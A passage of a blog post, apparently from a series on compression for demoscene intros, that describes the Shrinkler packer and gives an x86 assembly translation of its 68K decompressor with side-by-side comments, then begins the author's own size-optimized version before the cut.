style=\"color: #000000;\">_done</span>         <span style=\"color: #177500;\">; bne.b   byte_done</span>\n    <span style=\"color: #000000;\">lodsb</span>                    <span style=\"color: #177500;\">; move.b  (a2)+,d7</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">al</span>, <span style=\"color: #A90D91;\">al</span>            <span style=\"color: #177500;\">; addx.b  d7,d7</span>\n<span style=\"color: #000000;\">byte_done:</span>              \n    <span style=\"color: #000000;\">ret</span>                      <span style=\"color: #177500;\">; rts</span>\n</pre>\n</div>\n<h2 id=\"shrinkler\">11.2 Shrinkler</h2>\n<p>Designed by <a href=\"https://github.com/askeksa\">Aske Simon Christensen</a> (Blueberry/Loonies) and <a href=\"https://github.com/askeksa/Shrinkler\">published</a> in 1999. It stores compressed data in Big-Endian 32-bit words, and the x86 translation must use BSWAP before reading bits of the stream. The compressor is open source and could be updated to use Little-Endian format instead. Christensen is also a co-author of the <a href=\"http://www.crinkler.net/\">Crinkler executable compressor</a> along with <a href=\"https://twitter.com/stubbesaurus\">Rune Stubbe</a> (Mentor/TBC) that&#8217;s popular for 4K intros on Windows.</p>\n<p>The following is a description from Blueberry:</p>\n<p><strong>Shrinkler is optimized for target sizes around 4k (while still being good for 64k), which strongly favors decompression code size. It tries to achieve the best size for this target, somewhat at the expense of decompression speed. At the same time, it is intended to be useful on Amiga 500, which means that decompression speed should still be reasonable, and decompression memory usage should be small. Shrinkler decrunches a 64k intro in typically less than half a minute on Amiga 500, which is an acceptable wait time for starting an intro. And the memory needed for the probabilities fits within the default stack size of 4k on Amiga.</strong></p>\n<p><strong>Shrinkler also has special tweaks gearing it towards 16-bit oriented data (as all 68000 instructions are a multiple of 16 bits). Specifically, it keeps separate literal context groups for even and odd bytes, since these distributions are usually very different for Amiga data. Same thing for the flag indicating whether the a literal or a match is coming up. This gives a great boost for Amiga intros, but it has no benefit for data that has arbitrary alignment. It usually doesn&#8217;t hurt either, except for the slight cost in decompression code size.</strong></p>\n<p>The following is a translation of the 68K assembly to x86, with help from Blueberry.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #633820;\">    %define INIT_ONE_PROB       0x8000</span>\n<span style=\"color: #633820;\">    %define ADJUST_SHIFT        4</span>\n<span style=\"color: #633820;\">    %define SINGLE_BIT_CONTEXTS 1</span>\n<span style=\"color: #633820;\">    %define NUM_CONTEXTS        1536</span>\n\n    <span style=\"color: #A90D91;\">struc </span><span style=\"color: #000000;\">pushad_t</span>\n      <span style=\"color: #000000;\">.edi</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.esi</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>    \n      <span style=\"color: #000000;\">.ebp</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>    \n      <span style=\"color: #000000;\">.esp</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>     \n      <span style=\"color: #000000;\">.ebx</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.edx</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.ecx</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.eax</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n    <span style=\"color: #A90D91;\">endstruc</span>\n<span style=\"color: #A90D91;\">    </span>\n<span style=\"color: #A90D91;\">    </span><span style=\"color: #177500;\">; temporary variables for range decoder</span>\n<span style=\"color: #633820;\">    %define d2   4*0</span>\n<span style=\"color: #633820;\">    %define d3   4*1</span>\n<span style=\"color: #633820;\">    %define d4   4*2</span>\n<span style=\"color: #633820;\">    %define prob 4*3</span>\n<span style=\"color: #633820;\">    </span>\n<span style=\"color: #633820;\">    %ifndef BIN</span>\n      <span style=\"color: #A90D91;\">global </span><span style=\"color: #000000;\">ShrinklerDecompress</span>\n      <span style=\"color: #A90D91;\">global </span><span style=\"color: #000000;\">_ShrinklerDecompress</span>\n<span style=\"color: #633820;\">    %endif</span>\n    \n<span style=\"color: #000000;\">ShrinklerDecompress:</span>\n<span style=\"color: #000000;\">_ShrinklerDecompress:</span>\n    <span style=\"color: #177500;\">; save d2-d7/a4-a6 in -(a7) the stack</span>\n    <span style=\"color: #000000;\">pushad</span>                   <span style=\"color: #177500;\">; movem.l  d2-d7/a4-a6,-(a7)</span>\n\n    <span style=\"color: #177500;\">; esi = inbuf    </span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]   <span style=\"color: #177500;\">; move.l a0,a4</span>\n    <span style=\"color: #177500;\">; edi = outbuf</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>]   <span style=\"color: #177500;\">; move.l a1,a5</span>\n                             <span style=\"color: #177500;\">; move.l a1,a6</span>\n    <span style=\"color: #177500;\">; allocate local memory for range decoder</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">esp</span>, <span style=\"color: #1C01CE;\">4096</span>\n    <span style=\"color: #000000;\">test</span>   [<span style=\"color: #A90D91;\">esp</span>], <span style=\"color: #A90D91;\">esp</span>        <span style=\"color: #177500;\">; stack probe</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ebp</span>, <span style=\"color: #A90D91;\">esp</span>          <span style=\"color: #177500;\">; ebp = stack pointer</span>\n    \n    <span style=\"color: #177500;\">; Init range decoder state</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dword</span>[<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+d2</span>], <span style=\"color: #1C01CE;\">0</span>  <span style=\"color: #177500;\">; moveq.l  #0,d2</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dword</span>[<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+d3</span>], <span style=\"color: #1C01CE;\">1</span>  <span style=\"color: #177500;\">; moveq.l  #1,d3</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">dword</span>[<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+d4</span>], <span style=\"color: #1C01CE;\">1</span>  <span style=\"color: #177500;\">; moveq.l  #1,d4</span>\n    <span style=\"color: #000000;\">ror</span>    <span style=\"color: #A90D91;\">dword</span>[<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+d4</span>], <span style=\"color: #1C01CE;\">1</span>  <span style=\"color: #177500;\">; ror.l  #1,d4</span>\n\n    <span style=\"color: #177500;\">; Init probabilities</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #000000;\">NUM_CONTEXTS</span> <span style=\"color: #177500;\">; move.l #NUM_CONTEXTS, d6</span>\n<span style=\"color: #000000;\">.init:</span>  \n    <span style=\"color: #177500;\">; move.w  #INIT_ONE_PROB,-(a7)</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">word</span>[<span style=\"color: #000000;\">prob+</span><span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+</span><span style=\"color: #A90D91;\">edx</span><span style=\"color: #000000;\">*</span><span style=\"color: #1C01CE;\">2</span><span style=\"color: #000000;\">-</span><span style=\"color: #1C01CE;\">2</span>], <span style=\"color: #000000;\">INIT_ONE_PROB</span>  \n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">dx</span>, <span style=\"color: #1C01CE;\">1</span>             <span style=\"color: #177500;\">; subq.w #1,d6                        </span>\n    <span style=\"color: #000000;\">jne</span>    <span style=\"color: #000000;\">.init</span>             <span style=\"color: #177500;\">; bne.b  .init</span>\n    <span style=\"color: #177500;\">; D6 = 0</span>\n<span style=\"color: #000000;\">.lit:</span>\n    <span style=\"color: #177500;\">; Literal</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #1C01CE;\">1</span>             <span style=\"color: #177500;\">; addq.b #1,d6</span>\n<span style=\"color: #000000;\">.getlit:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetBit</span>            <span style=\"color: #177500;\">; bsr.b  GetBit</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #A90D91;\">dl</span>            <span style=\"color: #177500;\">; addx.b d6,d6</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">.getlit</span>           <span style=\"color: #177500;\">; bcc.b  .getlit</span>\n  \n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">edi</span>], <span style=\"color: #A90D91;\">dl</span>         <span style=\"color: #177500;\">; move.b d6,(a5)+</span>\n    <span style=\"color: #000000;\">inc</span>    <span style=\"color: #A90D91;\">edi</span>\n                             <span style=\"color: #177500;\">; bsr.b  ReportProgress</span>\n<span style=\"color: #000000;\">.switch:</span>\n    <span style=\"color: #177500;\">; After literal</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetKind</span>           <span style=\"color: #177500;\">; bsr.b  GetKind</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">.lit</span>              <span style=\"color: #177500;\">; bcc.b  .lit</span>\n    <span style=\"color: #177500;\">; Reference</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #000000;\">-</span><span style=\"color: #1C01CE;\">1</span>           <span style=\"color: #177500;\">; moveq.l  #-1,d6</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetBit</span>            <span style=\"color: #177500;\">; bsr.b  GetBit</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">.readoffset</span>       <span style=\"color: #177500;\">; bcc.b  .readoffset</span>\n<span style=\"color: #000000;\">.readlength:</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #1C01CE;\">4</span>            <span style=\"color: #177500;\">; moveq.l  #4,d6</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetNumber</span>         <span style=\"color: #177500;\">; bsr.b  GetNumber</span>\n<span style=\"color: #000000;\">.copyloop:</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">al</span>, [<span style=\"color: #A90D91;\">edi</span> <span style=\"color: #000000;\">+</span> <span style=\"color: #A90D91;\">ebx</span>]   <span style=\"color: #177500;\">; move.b (a5,d5.l),(a5)+</span>\n    <span style=\"color: #000000;\">stosb</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">1</span>            <span style=\"color: #177500;\">; subq.l #1,d7</span>\n    <span style=\"color: #000000;\">jne</span>    <span style=\"color: #000000;\">.copyloop</span>         <span style=\"color: #177500;\">; bne.b  .copyloop</span>\n                             <span style=\"color: #177500;\">; bsr.b  ReportProgress</span>\n    <span style=\"color: #177500;\">; After reference</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetKind</span>           <span style=\"color: #177500;\">; bsr.b  GetKind</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">.lit</span>              <span style=\"color: #177500;\">; bcc.b  .lit</span>\n<span style=\"color: #000000;\">.readoffset:</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #1C01CE;\">3</span>            <span style=\"color: #177500;\">; moveq.l  #3,d6</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetNumber</span>         <span style=\"color: #177500;\">; bsr.b  GetNumber</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #1C01CE;\">2</span>            <span style=\"color: #177500;\">; moveq.l  #2,d5</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">ebx</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; sub.l  d7,d5</span>\n    <span style=\"color: #000000;\">jne</span>    <span style=\"color: #000000;\">.readlength</span>       <span style=\"color: #177500;\">; bne.b  .readlength</span>\n\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">esp</span>, <span style=\"color: #1C01CE;\">4096</span>         <span style=\"color: #177500;\">; lea.l  NUM_CONTEXTS*2(a7),a7</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>]\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t.eax</span>], <span style=\"color: #A90D91;\">edi</span>\n    <span style=\"color: #000000;\">popad</span>                    <span style=\"color: #177500;\">; movem.l  (a7)+,d2-d7/a4-a6</span>\n    <span style=\"color: #000000;\">ret</span>                      <span style=\"color: #177500;\">; rts</span>\n\n<span style=\"color: #000000;\">ReportProgress:</span>\n    <span style=\"color: #177500;\">; move.l  a2,d0</span>\n    <span style=\"color: #177500;\">; beq.b .nocallback</span>\n    <span style=\"color: #177500;\">; move.l  a5,d0</span>\n    <span style=\"color: #177500;\">; sub.l a6,d0</span>\n    <span style=\"color: #177500;\">; move.l  a3,a0</span>\n    <span style=\"color: #177500;\">; jsr (a2)</span>\n<span style=\"color: #000000;\">.nocallback:</span>\n    <span style=\"color: #177500;\">; rts</span>\n\n<span style=\"color: #000000;\">GetKind:</span>\n    <span style=\"color: #177500;\">; Use parity as context</span>\n                             <span style=\"color: #177500;\">; move.l a5,d1</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #1C01CE;\">1</span>            <span style=\"color: #177500;\">; moveq.l  #1,d6</span>\n    <span style=\"color: #000000;\">and</span>    <span style=\"color: #A90D91;\">edx</span>, <span style=\"color: #A90D91;\">edi</span>          <span style=\"color: #177500;\">; and.l  d1,d6</span>\n    <span style=\"color: #000000;\">shl</span>    <span style=\"color: #A90D91;\">dx</span>, <span style=\"color: #1C01CE;\">8</span>             <span style=\"color: #177500;\">; lsl.w  #8,d6</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">GetBit</span>            <span style=\"color: #177500;\">; bra.b  GetBit</span>\n\n<span style=\"color: #000000;\">GetNumber:</span>\n    <span style=\"color: #177500;\">; EDX = Number context</span>\n    <span style=\"color: #177500;\">; Out: Number in ECX</span>\n    <span style=\"color: #000000;\">shl</span>    <span style=\"color: #A90D91;\">dx</span>, <span style=\"color: #1C01CE;\">8</span>             <span style=\"color: #177500;\">; lsl.w  #8,d6</span>\n<span style=\"color: #000000;\">.numberloop:</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #1C01CE;\">2</span>             <span style=\"color: #177500;\">; addq.b #2,d6</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetBit</span>            <span style=\"color: #177500;\">; bsr.b  GetBit</span>\n    <span style=\"color: #000000;\">jc</span>     <span style=\"color: #000000;\">.numberloop</span>       <span style=\"color: #177500;\">; bcs.b  .numberloop</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #1C01CE;\">1</span>            <span style=\"color: #177500;\">; moveq.l  #1,d7</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #1C01CE;\">1</span>             <span style=\"color: #177500;\">; subq.b #1,d6</span>\n<span style=\"color: #000000;\">.bitsloop:</span>\n    <span style=\"color: #000000;\">call</span>   <span style=\"color: #000000;\">GetBit</span>            <span style=\"color: #177500;\">; bsr.b  GetBit</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; addx.l d7,d7</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">dl</span>, <span style=\"color: #1C01CE;\">2</span>             <span style=\"color: #177500;\">; subq.b #2,d6</span>\n    <span style=\"color: #000000;\">jnc</span>    <span style=\"color: #000000;\">.bitsloop</span>         <span style=\"color: #177500;\">; bcc.b  .bitsloop</span>\n    <span style=\"color: #000000;\">ret</span>                      <span style=\"color: #177500;\">; rts</span>\n\n    <span style=\"color: #177500;\">; EDX = Bit context</span>\n\n    <span style=\"color: #177500;\">; d2 = Range value</span>\n    <span style=\"color: #177500;\">; d3 = Interval size</span>\n    <span style=\"color: #177500;\">; d4 = Input bit buffer</span>\n\n    <span style=\"color: #177500;\">; Out: Bit in C and X</span>\n<span style=\"color: #000000;\">readbit:</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">eax</span>, [<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+d4</span>]\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; add.l  d4,d4</span>\n    <span style=\"color: #000000;\">jne</span>    <span style=\"color: #000000;\">nonewword</span>         <span style=\"color: #177500;\">; bne.b  nonewword</span>\n    <span style=\"color: #000000;\">lodsd</span>                    <span style=\"color: #177500;\">; move.l (a4)+,d4</span>\n    <span style=\"color: #000000;\">bswap</span>  <span style=\"color: #A90D91;\">eax</span>               <span style=\"color: #177500;\">; data is stored in big-endian format</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">eax</span>          <span style=\"color: #177500;\">; addx.l d4,d4</span>\n<span style=\"color: #000000;\">nonewword:</span>\n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+d4</span>], <span style=\"color: #A90D91;\">eax</span> \n    <span style=\"color: #000000;\">mov</span>    [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+pushad_t.esi</span>], <span style=\"color: #A90D91;\">esi</span>\n    <span style=\"color: #000000;\">adc</span>    <span style=\"color: #A90D91;\">bx</span>, <span style=\"color: #A90D91;\">bx</span>            <span style=\"color: #177500;\">; addx.w d2,d2</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">cx</span>, <span style=\"color: #A90D91;\">cx</span>            <span style=\"color: #177500;\">; add.w  d3,d3</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #A90D91;\">ch</span><span style=\"color: #000000;\">eck_interval</span>\n<span style=\"color: #000000;\">GetBit:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ebx</span>, [<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+d2</span>]\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ecx</span>, [<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+d3</span>]\n<span style=\"color: #000000;\">check_interval:</span>\n    <span style=\"color: #000000;\">test</span>   <span style=\"color: #A90D91;\">cx</span>, <span style=\"color: #A90D91;\">cx</span>            <span style=\"color: #177500;\">; tst.w  d3</span>\n    <span style=\"color: #000000;\">jns</span>    <span style=\"color: #000000;\">readbit</span>           <span style=\"color: #177500;\">; bpl.b  readbit</span>\n\n    <span style=\"color: #177500;\">; lea.l 4+SINGLE_BIT_CONTEXTS*2(a7,d6.l),a1</span>\n    <span style=\"color: #177500;\">; add.l d6,a1</span>\n    <span style=\"color: #000000;\">lea</span>    <span style=\"color: #A90D91;\">edi</span>, [<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+prob+</span><span style=\"color: #1C01CE;\">2</span><span style=\"color: #000000;\">*</span><span style=\"color: #A90D91;\">edx</span><span style=\"color: #000000;\">+</span><span style=\"color: #A90D91;\">SI</span><span style=\"color: #000000;\">NGLE_BIT_CONTEXTS*</span><span style=\"color: #1C01CE;\">2</span>]      \n    <span style=\"color: #000000;\">movzx</span>  <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">word</span>[<span style=\"color: #A90D91;\">edi</span>]    <span style=\"color: #177500;\">; move.w (a1),d1</span>\n    <span style=\"color: #177500;\">; D1/EAX = One prob</span>\n\n    <span style=\"color: #000000;\">shr</span>    <span style=\"color: #A90D91;\">ax</span>, <span style=\"color: #000000;\">ADJUST_SHIFT</span>  <span style=\"color: #177500;\">; lsr.w  #ADJUST_SHIFT,d1</span>\n    <span style=\"color: #000000;\">sub</span>    [<span style=\"color: #A90D91;\">edi</span>], <span style=\"color: #A90D91;\">ax</span>         <span style=\"color: #177500;\">; sub.w  d1,(a1)</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">ax</span>, [<span style=\"color: #A90D91;\">edi</span>]         <span style=\"color: #177500;\">; add.w  (a1),d1</span>\n    \n    <span style=\"color: #000000;\">mul</span>    <span style=\"color: #A90D91;\">cx</span>                <span style=\"color: #177500;\">; mulu.w d3,d1</span>\n                             <span style=\"color: #177500;\">; swap.w d1</span>\n\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">bx</span>, <span style=\"color: #A90D91;\">dx</span>            <span style=\"color: #177500;\">; sub.w  d1,d2</span>\n    <span style=\"color: #000000;\">jb</span>     <span style=\"color: #000000;\">.one</span>              <span style=\"color: #177500;\">; blo.b  .one</span>\n<span style=\"color: #000000;\">.zero:</span>\n    <span style=\"color: #177500;\">; oneprob = oneprob * (1 - adjust) = oneprob - oneprob * adjust</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">cx</span>, <span style=\"color: #A90D91;\">dx</span>            <span style=\"color: #177500;\">; sub.w  d1,d3</span>\n    <span style=\"color: #177500;\">; 0 in C and X</span>\n                             <span style=\"color: #177500;\">; rts</span>\n    <span style=\"color: #000000;\">jmp</span>    <span style=\"color: #000000;\">exit_get_bit</span>\n<span style=\"color: #000000;\">.one:</span>\n    <span style=\"color: #177500;\">; onebrob = 1 - (1 - oneprob) * (1 - adjust) = oneprob - oneprob * adjust + adjust</span>\n    <span style=\"color: #177500;\">; add.w #$ffff&gt;&gt;ADJUST_SHIFT,(a1)</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">word</span>[<span style=\"color: #A90D91;\">edi</span>], <span style=\"color: #1C01CE;\">0xFFFF</span> <span style=\"color: #000000;\">&gt;&gt;</span> <span style=\"color: #000000;\">ADJUST_SHIFT</span> \n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">cx</span>, <span style=\"color: #A90D91;\">dx</span>            <span style=\"color: #177500;\">; move.w d1,d3</span>\n    <span style=\"color: #000000;\">add</span>    <span style=\"color: #A90D91;\">bx</span>, <span style=\"color: #A90D91;\">dx</span>            <span style=\"color: #177500;\">; add.w  d1,d2</span>\n    <span style=\"color: #177500;\">; 1 in C and X</span>\n<span style=\"color: #000000;\">exit_get_bit:</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">word</span>[<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+d2</span>], <span style=\"color: #A90D91;\">bx</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">word</span>[<span style=\"color: #A90D91;\">ebp</span><span style=\"color: #000000;\">+d3</span>], <span style=\"color: #A90D91;\">cx</span>\n    <span style=\"color: #000000;\">popad</span>\n    <span style=\"color: #000000;\">ret</span>                      <span style=\"color: #177500;\">; rts</span>\n</pre>\n</div>\n<p>The following is my own attempt to implement a size-optimized version of the same depacker in x86 assembly. However, there&#8217;s likely room for improvement here, and this code will be updated later.</p>\n<div class=\"highlight\" style=\"background: #ffffff;\">\n<pre style=\"line-height: 125%;\"><span></span><span style=\"color: #633820;\">    %define INIT_ONE_PROB       0x8000</span>\n<span style=\"color: #633820;\">    %define ADJUST_SHIFT        4</span>\n<span style=\"color: #633820;\">    %define SINGLE_BIT_CONTEXTS 1</span>\n<span style=\"color: #633820;\">    %define NUM_CONTEXTS        1536</span>\n\n    <span style=\"color: #A90D91;\">struc </span><span style=\"color: #000000;\">pushad_t</span>\n      <span style=\"color: #000000;\">.edi</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.esi</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.ebp</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.esp</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.ebx</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.edx</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.ecx</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.eax</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n    <span style=\"color: #A90D91;\">endstruc</span>\n\n<span style=\"color: #A90D91;\">    </span><span style=\"color: #000000;\">struc</span> <span style=\"color: #000000;\">shrinkler_ctx</span>\n      <span style=\"color: #000000;\">.esp</span>      <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>      <span style=\"color: #177500;\">; original value of esp before allocation</span>\n      <span style=\"color: #000000;\">.range</span>    <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>      <span style=\"color: #177500;\">; range value</span>\n      <span style=\"color: #000000;\">.ofs</span>      <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>\n      <span style=\"color: #000000;\">.interval</span> <span style=\"color: #000000;\">resd</span> <span style=\"color: #1C01CE;\">1</span>      <span style=\"color: #177500;\">; interval size</span>\n    <span style=\"color: #A90D91;\">endstruc</span>\n\n<span style=\"color: #A90D91;\">    </span><span style=\"color: #000000;\">bits</span> <span style=\"color: #1C01CE;\">32</span>\n\n<span style=\"color: #633820;\">    %ifndef BIN</span>\n      <span style=\"color: #A90D91;\">global </span><span style=\"color: #000000;\">shrinkler_depackx</span>\n      <span style=\"color: #A90D91;\">global </span><span style=\"color: #000000;\">_shrinkler_depackx</span>\n<span style=\"color: #633820;\">    %endif</span>\n\n<span style=\"color: #000000;\">shrinkler_depackx:</span>\n<span style=\"color: #000000;\">_shrinkler_depackx:</span>\n    <span style=\"color: #000000;\">pushad</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ebx</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">4</span>]   <span style=\"color: #177500;\">; edi = outbuf</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">esi</span>, [<span style=\"color: #A90D91;\">esp</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">32</span><span style=\"color: #000000;\">+</span><span style=\"color: #1C01CE;\">8</span>]   <span style=\"color: #177500;\">; esi = inbuf</span>\n\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">esp</span>\n    <span style=\"color: #000000;\">xor</span>    <span style=\"color: #A90D91;\">ecx</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; ecx = 4096</span>\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">ch</span>, <span style=\"color: #1C01CE;\">10h</span>\n    <span style=\"color: #000000;\">sub</span>    <span style=\"color: #A90D91;\">esp</span>, <span style=\"color: #A90D91;\">ecx</span>          <span style=\"color: #177500;\">; subtract 1 page</span>\n    <span style=\"color: #000000;\">test</span>   [<span style=\"color: #A90D91;\">esp</span>], <span style=\"color: #A90D91;\">esp</span>        <span style=\"color: #177500;\">; stack probe</span>\n\n    <span style=\"color: #000000;\">mov</span>    <span style=\"color: #A90D91;\">edi</span>, <span style=\"color: #A90D91;\">esp</span>\n    <span style=\"color: #000000;\">stosd</span>                    <span style=\"color: #177500;\">; save original value of esp</span>\n    <span style=\"color: #000000;\">cdq</span>\n    <span style=\"color: #000000;\">xchg</span>   <span style=\"color: #A90D91;\">eax</span>, <span style=\"color: #A90D91;\">edx</span>\n    <span style=\"color: #000000;\">stosd</span>                    <span style=\"color: #177500;\">; range value = 0</span>\n    <span style=\"color: #000000;\">stosd</span>                    <span style=\"color: #177500;\">; offset = 